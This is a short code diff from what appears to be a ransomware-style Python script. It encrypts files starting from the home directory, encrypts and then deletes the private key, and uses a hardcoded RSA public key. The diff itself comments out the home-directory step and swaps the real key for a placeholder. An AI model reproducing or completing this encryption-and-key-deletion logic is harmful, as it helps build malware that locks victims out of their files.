@@ -51,7 +51,7 @@ def encrypt(key,path):
 
 
 home = str(Path.home())
-os.chdir(home) #-------> uncomment this to start encryption from the home directory or 
+#os.chdir(home) -------> uncomment this to start encryption from the home directory or 
 			#else the script encrypts from the directory where the script is present 
 	
 
@@ -98,15 +98,7 @@ with open("private_pem.encrypted", 'wb') as fout:
 
 os.remove("private.pem")
 
-spub=b"""-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqInVdxiRc9RcrPIRMTrB
-YR6QWs3rKUKmCbWolhZCmjpB+/5wSV5tCfeyavMCwfDdGOsDAFtGUYHJLzmVVI3I
-CBmQZ1gc9RXfQwAtOeMbQt80RZo/YDUPqX0imToWnB3/vq37NS2mylB7S5nwA49F
-flZLY1osMuNlkonV90/XzyO3L940E8Or+u7/Bs0e1RRsveTb4m+DG64SrPxjMBvT
-geSVxp7p8jIpp8I1Df18NHfJol4g8XHY+t4BV83v9ZD3kmXH1uDYVWoS8nt9M7Km
-xV8RMARzH/H9IUlI+0p6O4o6KQBmynMqJ8PMRlft83BO6NvW2yH63cDuHWN8qyYS
-3QIDAQAB
------END PUBLIC KEY-----"""
+spub=b"""hardcoded-public-key-here"""
 
 keypub = RSA.import_key(spub)
 cipher_rsa1 = PKCS1_OAEP.new(keypub)
